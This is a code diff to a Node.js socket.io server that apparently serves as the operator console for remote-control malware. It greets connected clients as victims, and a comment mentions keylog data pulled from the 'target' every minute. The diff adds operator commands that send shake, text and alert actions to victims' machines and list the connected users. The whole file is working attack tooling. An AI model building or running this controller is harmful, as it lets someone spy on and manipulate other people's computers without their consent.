@@ -1,4 +1,7 @@
-const port = 3000;
+
+
+
+var port = 1337;
 
 const io = require('socket.io')(port, {
     cors: {
@@ -14,7 +17,7 @@ const rl = readline.createInterface(process.stdin, process.stdout)
 
 
 io.on('connection', socket => {
-    console.log(`new user: ${socket.id}`)
+    console.log(`\nnew user: ${socket.id}`)
     socket.emit("greet", "hello thanks for being a victim")
     // if keylog is on we get data from target every 1 minute
     
@@ -32,8 +35,8 @@ io.on('connection', socket => {
               return 
             }
       
-            if (line === "shake") {
-              socket.emit("shake", "shake")
+            if (line.includes("shake") && line.includes("(") && line.includes(")")){
+              socket.emit("shake", `${line.slice(6,-1)} `);
             } else if (line === "normal") {
               socket.emit("normal", "normal")
             } else if (line === "smile") {
@@ -41,6 +44,10 @@ io.on('connection', socket => {
               socket.emit("smile", "smile");
             } else if (line.includes("text") && line.includes("(") && line.includes(")")){
                 socket.emit("text", `${line.slice(5,-1)} `);
+            } else if (line === "lists"){
+                console.log("\nActive users: " + socket.id);
+            } else if (line.includes("alert") && line.includes("(") && line.includes(")")){
+              socket.emit("alert", `${line.slice(6,-1)} `);
             }
             rl.prompt()
       
